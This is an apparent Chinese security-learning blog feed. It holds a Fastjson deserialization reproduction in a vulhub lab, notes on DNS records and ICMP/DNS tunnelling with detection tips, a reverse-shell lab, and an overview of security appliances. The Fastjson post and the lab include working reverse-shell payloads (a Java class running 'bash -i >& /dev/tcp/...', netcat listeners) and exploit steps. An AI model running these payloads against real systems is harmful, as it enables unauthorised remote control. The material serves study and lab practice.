<p>至此，攻击者通过一个伪造的包裹，成功劫持<img src="https://raw.githubusercontent.com/Gu0f3n/img/mian/1741005491298.jpg" alt="img">了整个快递</p>
<h1 id="复现"><a href="#复现" class="headerlink" title="复现"></a>复现</h1><p>搭建环境就不演示了</p>
<p>首先在vulhubfastjson下面 创建一个test.java 内容如下</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> java.lang.Runtime;</span><br><span class="line"><span class="keyword">import</span> java.lang.Process;</span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">reverse</span>&#123;</span><br><span class="line">        <span class="keyword">static</span> &#123;</span><br><span class="line">                <span class="keyword">try</span>&#123;</span><br><span class="line">                        <span class="type">Runtime</span> <span class="variable">rt</span> <span class="operator">=</span> Runtime.getRuntime();</span><br><span class="line">                        String[] commands = &#123;<span class="string">&quot;bash&quot;</span>, <span class="string">&quot;-c&quot;</span>, <span class="string">&quot;bash -i &gt;&amp;  /dev/tcp/172.20.0.1/4563 0&gt;&amp;1&quot;</span>&#125;;</span><br><span class="line">                        <span class="type">Process</span> <span class="variable">pc</span> <span class="operator">=</span> rt.exec(commands);</span><br><span class="line">                        pc.waitFor();</span><br><span class="line">                &#125; <span class="keyword">catch</span> (Exception e) &#123;</span><br><span class="line">                        <span class="comment">// do nothing</span></span><br><span class="line">                &#125;</span><br><span class="line"></span><br><span class="line">        &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>目的就是把test.txt上传到目标主机 </p>
<p>然后进行编译 Javac reverse.java</p>
<p>然后我们在环境目录下起一个http服务 这一步部署rmi指定的文件下载服务器</p>
<p><img src="https://raw.githubusercontent.com/Gu0f3n/img/mian/007d447d-9ddc-4927-a3f5-1ce87e375326.png"></p>
<p>端口为5623</p>
<p>然后部署rmi服务器</p>
<p><a href="https://github.com/RandomRobbieBF/marshalsec-jar">https://github.com/RandomRobbieBF/marshalsec-jar</a></p>
<p><img src="https://raw.githubusercontent.com/Gu0f3n/img/mian/de6ca6b9-8cda-4cb2-80a9-bec740601853.png"></p>
<p>端口为8520</p>
<p>接着去web页面抓包</p>
<p><img src="https://raw.githubusercontent.com/Gu0f3n/img/mian/5cff3b0f-4fe6-4187-ba58-5b3a37871df1.png"></p>
<p>发包前先nc -lvp 4563</p>
<p>发包发现成功反弹shell</p>
<p><img src="https://raw.githubusercontent.com/Gu0f3n/img/mian/223a33e5-0d7d-45da-9eb4-52096a2f9f52.png"></p>
<p>写的比较好的文章<a href="https://homerqing.github.io/2020/04/10/fastjson/fastjson%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E7%9A%84%E9%98%B2%E5%BE%A1%E5%92%8C%E7%BB%95%E8%BF%87/">https://homerqing.github.io/2020/04/10/fastjson/fastjson%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E7%9A%84%E9%98%B2%E5%BE%A1%E5%92%8C%E7%BB%95%E8%BF%87/</a></p>
]]></content>
      <tags>
        <tag>fastjson</tag>
      </tags>
  </entry>
  <entry>
    <title>内网穿透初探</title>
    <url>/2025/03/21/%E5%86%85%E7%BD%91%E7%A9%BF%E9%80%8F%E5%88%9D%E6%8E%A2/</url>
    <content><![CDATA[<p>学习一下网络知识</p>
<p>主要学习下DNS,因为在后续的内网渗透与应急感觉用的会比较多</p>
<p>DNS解析流程有个大致的了解 这里就不一一细谈了主要还是学习一下域名解析记录</p>
<h2 id="域名解析记录"><a href="#域名解析记录" class="headerlink" title="域名解析记录"></a>域名解析记录</h2><h3 id="A记录（快递地址簿）"><a href="#A记录（快递地址簿）" class="headerlink" title="A记录（快递地址簿）****"></a><strong>A记录</strong>（快递地址簿）****</h3><p>代表Address，用来指定域名对应的IP地址，如将item.taobao.com指定到115.238.23.xxx，将switch.taobao.com指定到121.14.24.xxx。<strong>A****记录可以将多个域名解析到一个IP地址，但是不能将一个域名解析到多个IP地址</strong></p>
<p><em>例子</em>：<code>item.taobao.com</code>指向<code>115.238.23.xxx</code>，相当于告诉快递员“淘宝商品页的快递送到这个地址”</p>
<p><strong>特点</strong>：</p>
<ul>
<li>一个域名只能对应一个IP，但多个域名可以指向同一个IP（比如淘宝的多个子页面共用服务器）</li>
<li>如果服务器搬家（换IP），得手动改地址簿</li>
</ul>
<h3 id="MX记录（邮局分拣员）"><a href="#MX记录（邮局分拣员）" class="headerlink" title="MX记录（邮局分拣员）"></a><strong>MX记录（邮局分拣员）</strong></h3><p>Mail Exchange，就是可以将某个域名下的邮件服务器指向自己的Mail Server，如taobao.com域名的A记录IP地址是115.238.25.xxx，如果将MX记录设置为115.238.25.xxx，即<a href="mailto:&#120;&#120;&#120;&#64;&#116;&#97;&#111;&#x62;&#x61;&#x6f;&#46;&#99;&#111;&#109;">&#120;&#120;&#120;&#64;&#116;&#97;&#111;&#x62;&#x61;&#x6f;&#46;&#99;&#111;&#109;</a>的邮件路由，DNS会将邮件发送到115.238.25.xxx所在的服务器，而正常通过Web请求的话仍然解析到A记录的IP地址<br><strong>功能</strong>：专门管邮件的“快递路线”。告诉别人发到你这个域名的邮件该送到哪个邮局（邮件服务器）。<em>例子</em>：<code>xxx@taobao.com</code>的邮件会被送到<code>115.238.25.xxx</code>的服务器，而网页访问还是走A记录的地址</p>
<p><strong>特点</strong>：</p>
<ul>
<li>可以设多个邮局，优先级数字小的先送（比如优先级5的服务器优先于10的）</li>
<li>邮件服务器坏了，备用的会自动顶上</li>
</ul>
<h3 id="CNAME记录（连锁店别名）"><a href="#CNAME记录（连锁店别名）" class="headerlink" title="CNAME记录（连锁店别名）"></a><strong>CNAME记录（连锁店别名）</strong></h3><p>Canonical Name，即别名解析。所谓别名解析就是可以为一个域名设置一个或者多个别名，如将aaa.com解析到bbb.net、将ccc.com也解析到bbb.net，其中bbb.net分别是aaa.com和ccc.com的别名</p>
<p><strong>功能</strong>：给域名起外号，多个名字指向同一个地方</p>
<p><em>例子</em>：<code>aaa.com</code>和<code>ccc.com</code>都指向<code>bbb.net</code>，就像“肯德基”和“KFC”是同一家店</p>
<p><strong>特点</strong></p>
<p>换服务器地址时，只用改主域名（比如<code>bbb.net</code>的IP），所有别名自动更新，不用一个个改</p>
<p>必须带前缀（比如<code>www.taobao.com</code>不能直接叫<code>taobao.com</code>，得用A记录</p>
<h3 id="NS记录（快递公司总部）"><a href="#NS记录（快递公司总部）" class="headerlink" title="NS记录（快递公司总部）"></a><strong>NS记录（快递公司总部）</strong></h3><p>为某个域名指定DNS解析服务器，也就是这个域名由指定的IP地址的DNS服务器取解析</p>
<p><strong>功能</strong>：指定谁负责你家域名的“快递分拣”（DNS解析）。<br><em>例子</em>：如果你用腾讯云的DNS服务，NS记录会写成<code>ns1.dnspod.com</code>，相当于把快递分拣工作外包给腾讯</p>
<p><strong>特点</strong></p>
<p>一个域名可以有多个分拣中心（比如主备DNS服务器）</p>
<p>改NS记录后，全球生效需要24-48小时（因为各地快递公司更新地址簿要时间）</p>
<h3 id="TXT记录（店铺留言板）"><a href="#TXT记录（店铺留言板）" class="headerlink" title="TXT记录（店铺留言板）"></a><strong>TXT记录（店铺留言板）</strong></h3><p>为某个主机名或域名设置说明，如可以为ddd.net设置TXT记录为”这是XXX的博客”这样的说明</p>
<p><strong>功能</strong>：给域名贴个“备注标签”，用来验证身份或防垃圾邮件</p>
<p><em>例子</em>：</p>
<p>验证域名所有权：加一条TXT记录<code>google-site-verification=xxxxx</code>，证明你是网站主人</p>
<p>防垃圾邮件：设置SPF记录<code>v=spf1 include:aliyun.com ~all</code>，告诉别人“只有阿里云的服务器能代表我发邮件</p>
<p><strong>特点</strong></p>
<p>内容随便写，但格式要对（比如SPF记录必须以<code>v=spf1</code>开头）</p>
<p>简单学习了这个协议的基础知识之后就准备学习内网穿透的知识</p>
<h1 id="内网渗透系列：内网穿透（隧道）学习"><a href="#内网渗透系列：内网穿透（隧道）学习" class="headerlink" title="内网渗透系列：内网穿透（隧道）学习"></a>内网渗透系列：内网穿透（隧道）学习</h1><h2 id="内网穿透概述"><a href="#内网穿透概述" class="headerlink" title="内网穿透概述"></a>内网穿透概述</h2><h5 id="内网穿透"><a href="#内网穿透" class="headerlink" title="内网穿透"></a>内网穿透</h5><p>利用各种隧道技术，以网络防火墙允许的协议，绕过网络防火墙的封锁，实现访问被封锁的目标网络</p>
<p><em>内网穿透，也即 NAT 穿透，进行 NAT 穿透是为了使具有某一个特定源 IP 地址和源端口号的数据包不被 NAT 设备屏蔽而正确路由到内网主机。</em></p>
<p>简单来说内网穿透的目的是：让外网能访问你本地的应用，例如在外网打开你本地<a href="http://127.0.0.1指向的web站点.举例子我的世界你想要进行局域网联机同时要和你远在天边的朋友进行游玩那么盆友就可以利用内网穿透来达成与你玩的目的/">http://127.0.0.1指向的Web站点。举例子我的世界你想要进行局域网联机同时要和你远在天边的朋友进行游玩那么盆友就可以利用内网穿透来达成与你玩的目的</a></p>
<p>这里简单了解下NAT协议</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">**NAT 协议（Network Address Translation）** 的应用场景如同它的名称——网络地址转换，应用于内部网到外部网的地址转换过程中。</span><br><span class="line"></span><br><span class="line">**核心功能**：把内网设备的“私有门牌号”（私有IP）转换成外网的“公共门牌号”（公网IP），方便内外网通信</span><br><span class="line"></span><br><span class="line">*例子*：你家在小区3号楼（内网IP `192.168.1.5`），但快递单上只能写小区大门地址（公网IP `219.155.6.240`），门卫（NAT设备）负责把快递送到你家</span><br><span class="line"></span><br><span class="line">**为什么需要NAT？****</span><br><span class="line"></span><br><span class="line">**根本原因**：全球公网IP不够用（类似门牌号不够），而小区（内网）可以无限复制私有门牌号</span><br></pre></td></tr></table></figure>

<p>那么想要实现内网穿透就得进行一个搭建桥梁</p>
<h3 id="常见实现方式（怎么搭桥？）"><a href="#常见实现方式（怎么搭桥？）" class="headerlink" title="常见实现方式（怎么搭桥？）****"></a><strong>常见实现方式</strong>（怎么搭桥？）****</h3><p>端口映射 反向代理，vpn隧道，NAT进行穿透</p>
<p>端口映射就是把内网的ip都映射到一个公网的端口上面所有的流量就会从公网ip端口进入到你的内网ip</p>
<p>反向代理 就比如说我们租一个云服务器，别人对云服务的公网ip进行访问，服务器会把别人访问的流量转接到我们内网的设备</p>
<p><strong>例子</strong>：用frp工具把内网摄像头画面通过云服务器暴露给外网</p>
<p>vpn就是开一条新的隧道 直接到公网不会经过运营商</p>
<p>内网穿透（NAT穿透）蒋NAT设备记录用来把内部网络的私有IP地址映射到外部网络的合法IP地址上去</p>
<p>搞清楚内网穿透的基本原理</p>
<p>终于到隧道技术了</p>
<h1 id="隧道技术"><a href="#隧道技术" class="headerlink" title="隧道技术"></a><strong>隧道技术</strong></h1><p>一种通过使用互联网络的基础设施在网络之间传递数据的方式，包括数据封装、传输和解包在内的全过程。使用隧道传递的数据(或负载)可以是不同协议的数据帧或包。</p>
<p>用大白话解释<strong>隧道技术</strong>，可以想象成<strong>给数据包穿马甲过安检</strong>的过程</p>
<p>整个过程就像快递员要把违禁品送过安检，必须套个合法的包装，过了检查再拆开还原。具体分三步走</p>
<h3 id="第一步：穿马甲（封装）"><a href="#第一步：穿马甲（封装）" class="headerlink" title="第一步：穿马甲（封装）"></a><strong>第一步：穿马甲（封装）</strong></h3><p><strong>伪装需求</strong>：比如你想从公司内网传文件到家里，但公司防火墙只允许HTTP流量通过（其他协议全被拦截）</p>
<p><strong>套外壳</strong>：隧道技术会把你的文件数据（比如SSH协议）塞进HTTP协议的“快递箱”里，并贴上新标签（如目标地址、端口）</p>
<p><em>就像把私密信件塞进月饼盒，外面写上“节日礼品”蒙混过关。</em></p>
<h3 id="第二步：过安检（传输）"><a href="#第二步：过安检（传输）" class="headerlink" title="第二步：过安检（传输）"></a><strong>第二步：过安检（传输）</strong></h3><p><strong>走公共通道</strong>：伪装后的数据包通过公共网络（比如互联网）传输，防火墙看到的是合法的HTTP流量，直接放行<em>比如用微信发文件，实际走的是微信的服务器通道，而不是直连对方电脑。</em></p>
<p><strong>路由中转</strong>：数据包可能经过多个路由器跳转，但全程保持“马甲”不脱落<em>类似快递从北京发广州，中间经过郑州、长沙中转站，但月饼盒始终完好</em></p>
<h3 id="第三步：拆包裹（解包）"><a href="#第三步：拆包裹（解包）" class="headerlink" title="第三步：拆包裹（解包）"></a><strong>第三步：拆包裹（解包）</strong></h3><p><strong>目的地验收</strong>：数据包到达目标服务器后，隧道端点（如家里的VPN服务器）会拆掉HTTP的“马甲”，还原出原始数据（SSH协议文件）</p>
<p><em>就像收到月饼盒后拆开，取出里面的私密信件</em><strong>精准投递</strong>：解包后的数据按原始协议送到最终设备（如你的家用电脑）</p>
<p>按所处的协议层分层：</p>
<ul>
<li>网络层隧道：ICMP隧道等</li>
<li>传输层隧道：TCP隧道、UDP隧道</li>
<li>应用层隧道：HTTP、DNS、SSH等隧道</li>
</ul>
<p><img src="https://raw.githubusercontent.com/Gu0f3n/img/mian/20250321142723.png"></p>
<p>那么内网里面除了刚才了解到的http协议可以通过防火墙进行出网还有哪些协议呢</p>
<h3 id="内网主机所有可能的出网方式"><a href="#内网主机所有可能的出网方式" class="headerlink" title="内网主机所有可能的出网方式"></a>内网主机所有可能的出网方式</h3><h5 id="允许ICMP协议出网"><a href="#允许ICMP协议出网" class="headerlink" title="允许ICMP协议出网"></a>允许ICMP协议出网</h5><h2 id="ICMP隧道原理"><a href="#ICMP隧道原理" class="headerlink" title="ICMP隧道原理"></a>ICMP隧道原理</h2><p>首先了解下ICMP这个协议</p>
<p>ICMP（Internet Control Message Protocol）Internet控制报文协议。它是TCP&#x2F;IP协议簇的一个子协议，用于在IP主机、路由器之间传递控制消息。控制消息是指网络通不通、主机是否可达、路由是否可用等网络本身的消息。这些控制消息虽然并不传输用户数据，但是对于用户数据的传递起着重要的作用。</p>
<p>简单来说就是一个检查网络可不可达的协议</p>
<p>原理</p>
<p>由于ICMP报文自身可以携带数据，而且ICMP报文是由系统内核处理的，不占用任何端口，因此具有很高的隐蔽性。</p>
<p>通常ICMP隧道技术采用ICMP的ICMP_ECHO和ICMP_ECHOREPLY两种报文，把数据隐藏在ICMP数据包包头的选项域中，利用ping命令建立隐蔽通道。</p>
<p><img src="https://raw.githubusercontent.com/Gu0f3n/img/mian/6a123b327b673db81ffb5ffb471e2cc.png"></p>
<p>进行隐蔽传输的时候，肉鸡(防火墙内部)运行并接受外部攻击端的ICMP_ECHO数据包，攻击端把需要执行的命令隐藏在ICMP_ECHO数据包中，肉鸡接收到该数据包，解出其中隐藏的命令，并在防火墙内部主机上执行，再把执行结果隐藏在ICMP_ECHOREPLY数据包中，发送给外部攻击端。</p>
<p>比如：攻击者把指令<code>whoami</code>藏在数据区，发到内网机器，内网机器执行<code>whoami</code>后，把结果藏在回应的ICMP包里发回去</p>
<h3 id="ICMP隧道能干啥？"><a href="#ICMP隧道能干啥？" class="headerlink" title="ICMP隧道能干啥？"></a><strong>ICMP隧道能干啥？</strong></h3><p><strong>绕过防火墙</strong>：</p>
<p>内网机器被限制只能<code>ping</code>外网，但通过ICMP隧道可以偷偷传文件或远程控制</p>
<ul>
<li><em>例子：公司内网禁止SSH，但允许<code>ping</code>，员工用ICMP隧道传敏感文件。</em></li>
</ul>
<p><strong>反弹Shell</strong></p>
<p>攻击者通过ICMP包向受害机器发送指令，受害机器执行后通过ICMP包返回结果，实现远程控制</p>
<p><strong>内网穿透</strong></p>
<p>内网主机通过ICMP隧道将流量转发到公网代理，实现访问外网资源（类似早年免费上网的“黑科技”）</p>
<h3 id="三、ICMP隧道的优缺点"><a href="#三、ICMP隧道的优缺点" class="headerlink" title="三、ICMP隧道的优缺点"></a><strong>三、ICMP隧道的优缺点</strong></h3><h4 id="优点"><a href="#优点" class="headerlink" title="优点"></a><strong>优点</strong></h4><p><strong>隐蔽性强</strong>：数据藏在<code>ping</code>包里，防火墙一般不管</p>
<p><strong>无需端口</strong>：直接利用系统内核处理ICMP协议，不依赖特定端口</p>
<h4 id="缺点"><a href="#缺点" class="headerlink" title="缺点"></a><strong>缺点</strong></h4><p><strong>速度慢</strong>：ICMP包默认数据量小（Windows 32字节、Linux 48字节），大文件传输像蚂蚁搬家</p>
<p><strong>不稳定</strong>：ICMP是无连接协议，容易丢包，适合传小指令，不适合高清视频</p>
<p><strong>权限要求高</strong>：修改ICMP数据需要管理员权限（普通用户玩不转）</p>
<h3 id="检测"><a href="#检测" class="headerlink" title="检测"></a>检测</h3><ul>
<li><p>检测同一来源 ICMP 数据包的数量。一个正常的 ping 每秒最多只会发送两个数据包，而使用 ICMP隧道的浏览器在同一时间会产生上千个 ICMP 数据包。</p>
</li>
<li><p>寻找那些响应数据包中 payload 跟请求数据包不一致的 ICMP 数据包。</p>
</li>
<li><p>注意那些 ICMP 数据包中 payload 大于 64 比特的数据包。当然 icmptunnel 可以配置限制所有数据包的 payload 为 64 比特，这样会使得更难以被检测到。</p>
</li>
<li><p>检查ICMP数据包的协议标签，例如icmptunnel 会在所有的 ICMPpayload 前面增加 ‘TUNL’ 标记以用于识别隧道，这就是特征。</p>
</li>
</ul>
<h1 id="允许特定的TCP或UDP协议端口出网"><a href="#允许特定的TCP或UDP协议端口出网" class="headerlink" title="允许特定的TCP或UDP协议端口出网"></a>允许特定的TCP或UDP协议端口出网</h1><p>络防火墙允许特定的TCP或者UDP端口出网，比如连接外网的22、53、80、443、3389等常见应用的默认监听端口。</p>
<p>在一个不能出网的网络环境里面，将所有的TCP和UPD端口都探测一遍，通常都能发现有一两个常见的端口能出网。这通常是由于网络管理员的错误配置和偷懒行为导致：</p>
<p>比如配置的防火墙规则前后矛盾，解析的时候遇到匹配规则就退出执行<br>比如网络管理员配置允许web服务器访问另一子网的mysql数据库的3306端口。网络管理员配置时偷懒，可能会直接放行web服务器到任意ip地址的3306端口</p>
<h1 id="DNS隧道"><a href="#DNS隧道" class="headerlink" title="DNS隧道"></a>DNS隧道</h1><h5 id="允许特定的应用层协议出网（比如HTTP、SSH、DNS等应用层协议）"><a href="#允许特定的应用层协议出网（比如HTTP、SSH、DNS等应用层协议）" class="headerlink" title="允许特定的应用层协议出网（比如HTTP、SSH、DNS等应用层协议）"></a>允许特定的应用层协议出网（比如HTTP、SSH、DNS等应用层协议）</h5><p>这种网络防火墙能识别应用层的协议，放行允许出网的协议，比如HTTP、SSH、DNS、RDP等应用层协议</p>
<p>原理</p>
<p>端口不和服务绑定，可以传输任何数据。</p>
<p>详细聊聊这段文字 端口不和服务绑定是什么意思呢，意思就是DNS的53号端口它如果只能传递带有DNS头的数据包的流量这个就叫做端口和服务进行绑定但是DNS端口可以传输文件，指令甚至可以传输电影 这个意思就是端口和服务没有进行绑定 这就造成了我们对DNS隧道的一个利用</p>
<p>C&amp;C服务器在建立连接后将指令传递给客户端上的后门程序。</p>
<p>客户端后门程序进行DNS查询时，如果查询的域名不在DNS服务器本机的缓存中，就会访问互联网进行查询，然后返回结果，如果互联网上有一台攻击者设置的服务器，那么服务器就可以依靠域名解析的响应进行数据包的交换，从DNS协议的角度来看，这样的操作只是反复查询某个或者某些特定的域名并且得到解析结果，但其本质是，DNS预期的返回结果应该是一个IP地址，而事实上返回的可以是任意字符串，包括加密的C&amp;C指令，从而将其他协议封装在DNS协议中进行传输。<br>DNS隧道（直联型）木马的通信结构如下：</p>
<p><img src="https://raw.githubusercontent.com/Gu0f3n/img/mian/c35866a915140c30a95b310e6f3fe54.png"></p>
<p>直连也就是客户端直接和指定的目标DNS Server(Authoritative NS Server)连接，通过将数据编码封装在DNS协议中进行通信，这种方式速度更快，但是隐蔽性较差，容易被WAF或者IDS设备探测到，另外限制比较高，很多实际场景下不允许攻击者来自定义DNS Server，否则很容易被发现。</p>
<p>名中继型：</p>
<p>通过DNS递归查询实现的中继隧道，比较隐蔽，但同时因为数据包到达目标DNS Server前需要经过多个节点，所以速度上较直连慢很多(其实就类似伪造一台私有DNS Server，当然也许大佬神仙们真有一台权威DNS Server也说不一定哈)，同时我们还需要规避本地客户端的DNS缓存，这里可以使用随机域名生成算法（DGA）。很多恶意软件利用该算法生成随机域名，有效绕过黑名单检测，通过轮询的方式尝试连接，寻找C2控制中心。（DGA算法的检测测方法也有不少，这里按下不表）<br><img src="C:\Users\GuoFen\AppData\Roaming\Typora\typora-user-images\image-20250321154330405.png" alt="image-20250321154330405"></p>
<p>①受到木马控制的PC将数据封装到DNS数据报文里，向位于内网的本地域名服务器请求查询baidu.com</p>
<p>②本地域名服务器透过防火墙向根域名服务器发送查询请求</p>
<p>③经过大量的递归重定向，查询请求发到baidu.com的（伪造）权威域名服务器</p>
<p>④baidu.com（伪造）权威域名服务器是在攻击者控制下，解析并发送响应包</p>
<p>⑤dns响应包穿透内网防火墙</p>
<p>⑥进入内网</p>
<p>⑦本地域名服务器将响应包返回给受控客户端检测：</p>
<p>缺点：</p>
<ul>
<li><strong>速度慢</strong>：DNS查询需要来回多次，传大文件会急死人。</li>
<li><strong>可能被检测</strong>：防火墙发现大量异常DNS请求会报警。</li>
<li><strong>需要自建NS服务器</strong>：得有个服务器随时待命处理查询。</li>
</ul>
<h3 id="检测-1"><a href="#检测-1" class="headerlink" title="检测"></a>检测</h3><ul>
<li>每个IP地址的DNS流量异常，DNS报文数量大</li>
<li>DNS消息中TXT或NULL等不常用的记录类型多</li>
<li>DNS消息中域名有部分固定不变</li>
<li>DNS服务器的地理位置异常</li>
<li>访问非受信的DNS服务器</li>
<li>基于请求域名长度及请求频率统计分析方法</li>
<li>dnscat 查询中包含了dnscat 字符串</li>
</ul>
]]></content>
      <categories>
        <category>network</category>
      </categories>
      <tags>
        <tag>network</tag>
      </tags>
  </entry>
  <entry>
    <title>反弹shell的实验</title>
    <url>/2024/07/18/%E5%8F%8D%E5%BC%B9shell%E7%9A%84%E5%AE%9E%E9%AA%8C/</url>
    <content><![CDATA[<h1 id="反弹shell实验"><a href="#反弹shell实验" class="headerlink" title="反弹shell实验"></a>反弹shell实验</h1><p>之前国赛ciscn2024坐牢</p>
<p>web题目简直难如登天</p>
<p>但是还是有大佬把题目做出来了，而且用的技术非常高端反弹shell</p>
<p>今天终于抽出时间来做这个反弹shell的实验</p>
<p>首先我们先自己搭建一个自己的服务器（以后自己做题目也得用）这里我用的阿里云，因为它可以试用</p>
<p>网址<a href="https://developer.aliyun.com/">https://developer.aliyun.com/</a></p>
<p>这里反弹shell的原理之前讲过了，这里就不讲了</p>
<p>搭建好服务器</p>
<p>第一步先设置服务器，这里需要开放一个端口用来反弹shell，我这里用的7777端口<img src="/imgs/1.png"></p>
<p>后续我们也会用这个端口复现下国赛的题目</p>
<p>然后我们用自己的shell来连上我们的服务器</p>
<p>刚连上服务器需要自己下载nc</p>
<p>我们用自己的服务器作为攻击端</p>
<p>用我的kali作为被攻击端</p>
<p>在服务器上</p>
<figure class="highlight livescript"><table><tr><td class="code"><pre><span class="line">nc -lvvp <span class="number">7777</span>//监听<span class="number">7777</span>端口</span><br></pre></td></tr></table></figure>

<p>然后在kali上</p>
<figure class="highlight livescript"><table><tr><td class="code"><pre><span class="line">bash -i &gt;&amp; /dev/tcp/<span class="number">8.xxx</span>.xxx.xxx/<span class="number">7777</span> <span class="number">0</span>&gt;&amp;<span class="number">1</span></span><br></pre></td></tr></table></figure>

<p>成功连接上</p>
<p><img src="/imgs/2.png"></p>
<p>做这个实验也是花了一些时间</p>
<p>当时没想到服务器要自己去打开端口</p>
<p>没关系成功了就行</p>
]]></content>
      <tags>
        <tag>实验</tag>
      </tags>
  </entry>
  <entry>
    <title>常见安全设备总结</title>
    <url>/2025/03/27/%E5%B8%B8%E8%A7%81%E5%AE%89%E5%85%A8%E8%AE%BE%E5%A4%87%E6%80%BB%E7%BB%93%E2%80%9C/</url>
    <content><![CDATA[<h2 id="一、网络安全设备"><a href="#一、网络安全设备" class="headerlink" title="一、网络安全设备"></a>一、网络安全设备</h2><p>网络安全设备是一个有软件和硬件设备组合而成、在内部网和外部网之间、专用网与公共网 之间的界面上构造的保护屏障，针对不同的应用场景有不同的作用，常见的安全设备有防火墙，态势感知，IDS，IPS，全流量分析，漏洞扫描，蜜罐 ，安全邮件，EDR等等。</p>
<h2 id="网络结构"><a href="#网络结构" class="headerlink" title="网络结构"></a>网络结构</h2><p>首先，绘制了最简易三层<a href="https://so.csdn.net/so/search?q=%E7%BD%91%E7%BB%9C%E6%8B%93%E6%89%91%E7%BB%93%E6%9E%84&spm=1001.2101.3001.7020">网络拓扑结构</a>(含内外网)。现无任何安全设备，介绍每一类设备，常用功能、<strong>部署方式</strong>，同时绘入现有拓扑中，展示种产品在网络中最常规位置。</p>
<p><strong>部署方式尤其重要，通常需对网络进行控制设备串行、审计类设备旁挂，串行时设备故障可能产生网络故障；而旁挂设备只影响自身功能</strong></p>
<p><a href="https://blog.csdn.net/weixin_46444606/article/details/114528599">https://blog.csdn.net/weixin_46444606/article/details/114528599</a></p>
<h2 id="1-防火墙"><a href="#1-防火墙" class="headerlink" title="1.防火墙"></a>1.防火墙</h2><p>串行设备<br>网络边界间的隔离和对网络中数据交互的控制。在典型的网络环境中的主要作用是防范外部网络（如internet）对内部网络（如内部办公局域网）的非法访问行为和恶意攻击行为等安全威胁，防火墙最基础的功能是策略控制流入流出IP及端口、nat、端口映射。防火墙定义也较为模糊，多带有集成功能，目前，世面上购买的防火墙大多也带有IPS功能或服务（兼顾功能）<br>防火墙的“串行设备”特性让它成为网络边界的<strong>唯一关卡</strong>，通过策略、NAT、端口映射三大基础功能，加上现代集成的IPS等高级能力，实现了“外防入侵、内控风险”的效果。不过，它也不是万能的——就像门卫可能漏掉伪装成快递的黑客，防火墙也需要配合其他设备（如IDS、日志审计）才能更安全</p>
<h2 id="2-IPS（入侵防御系统）"><a href="#2-IPS（入侵防御系统）" class="headerlink" title="2.IPS（入侵防御系统）"></a>2.IPS（入侵防御系统）</h2><p><strong>串行设备</strong><br>防御网络中的攻击和入侵等行为的网关型安全设备，<strong>在安全功能上是对防火墙的一个补充，</strong> 它能够比防火墙更深入的对数据进行检测和控制，进而提升网络对于入侵攻击等威胁的防范水平。<strong>本质是增强入侵行为库，检测出后自动进行防御</strong></p>
<p><strong>如何补充防火墙</strong></p>
<p>防火墙像小区的门卫，只检查“快递单”（IP 地址、端口号），比如：</p>
<p><strong>门卫的局限</strong>：能拦住没工牌的外人，但如果坏人伪造了工牌（比如通过合法端口发送攻击数据），门卫就放行了</p>
<p><strong>IPS 的升级</strong>：IPS 会拆开快递包裹检查内容，比如</p>
<p>发现包裹里藏了刀片（SQL 注入代码）或炸弹（病毒文件），直接拦截</p>
<p>甚至能识别新型攻击手段，比如伪装成正常文件的勒索软件</p>
<h2 id="态势感知"><a href="#态势感知" class="headerlink" title="态势感知"></a>态势感知</h2><p>态势感知是一种基于环境的、动态、整体地洞悉安全风险的能力，是以安全大数据为基础，从全局视角提升对安全威胁的发现识别、理解分析、响应处置能力的一种方式，最终是为了决策与行动， 是安全能力的落地</p>
<p><strong>态势感知</strong>就像给网络装了一个“智能雷达+预言家”的组合，它能 <strong>实时监控整个网络环境</strong>，把各种零散的信息拼成一张“安全地图”，然后告诉你：“现在哪儿有问题？接下来可能要出什么事？咱们该怎么防？”<br>简单说就是：<strong>看清现状、预测风险、提前动手</strong>，让网络从“被动挨打”变成“主动防</p>
<p><strong>态势感知 &#x3D; 实时监控 + 智能分析 + 风险预言</strong>。它让网络安全从“头痛医头”变成“治未病”，核心就一句话：<strong>“别等黑客动手，咱先堵死他的路！</strong></p>
<h2 id="蜜罐"><a href="#蜜罐" class="headerlink" title="蜜罐"></a>蜜罐</h2><p>蜜罐这个词，最早是被猎人使用的，对，就是进山打猎的人。猎人把罐子装上 蜂蜜，然后放个陷阱，专门用来捕捉喜欢甜食的熊。后来在网络安全领域里， 人们就把欺骗攻击者的诱饵称为“蜜罐”</p>
<p><strong>蜜罐</strong>就像网络世界里的 <strong>“钓鱼陷阱”</strong>，专门用来忽悠黑客。它的核心逻辑就是：<strong>假装自己是个“软柿子”，吸引坏人过来捏，然后偷偷记下他们的作案手法</strong>。<br>说白了，蜜罐就是一个 <strong>“假目标”</strong>，故意露出破绽让黑客攻击，实际目的是为了摸清对方的路数，保护真正的系统。</p>
<h2 id="威胁情报"><a href="#威胁情报" class="headerlink" title="威胁情报"></a>威胁情报</h2><p>威胁情报是指在网络安全领域中，通过对恶意活动进行收集、分析和处理，形成有关网络威胁的情报信息，以便及时采取措施保障网络安全。威胁情报主要包括恶意软件、网络攻击、网络犯罪等方面的情报信息。</p>
<p> 威胁情报可以帮助网络安全人员了解当前的威胁形势，及时发现和识别安全威胁，以便采取相应的应对措施。威胁情报的来源包括自主收集、共享交流等多种形式，其分析和处理过程则需要依靠各种技术手段，如威胁情报分析工具、情报交换平台等。威胁情报的重要性逐渐受到广泛关注，成为网络安全工作中不可或缺的一环</p>
<p><strong>威胁情报</strong>就像网络世界的 <strong>“敌情报告”</strong>，专门用来帮企业和机构 <strong>提前看清坏人要干啥、怎么干，然后堵死他们的路</strong>。简单来说，就是通过 <strong>收集坏人的作案工具、分析他们的套路、预测他们的目标</strong>，让网络安全从 <strong>“被黑客打完了再哭”</strong> 变成 <strong>“提前把门焊死”</strong></p>
<p>常见威胁情报平台</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">https://x.threatbook.cn/</span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">https://redqueen.tj-un.com/</span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">https://ti.360.net/</span><br></pre></td></tr></table></figure>

